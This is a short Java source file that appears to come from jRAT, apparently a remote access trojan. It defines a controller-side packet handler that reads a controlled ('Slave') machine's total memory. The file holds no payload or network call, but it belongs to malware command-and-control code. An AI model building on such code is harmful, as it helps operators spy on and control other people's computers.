package jrat.controller.packets.incoming;

import jrat.controller.Slave;


public class Packet13InitTotalMemory extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		long total = slave.readLong();
		slave.setMemory(total);
	}

}
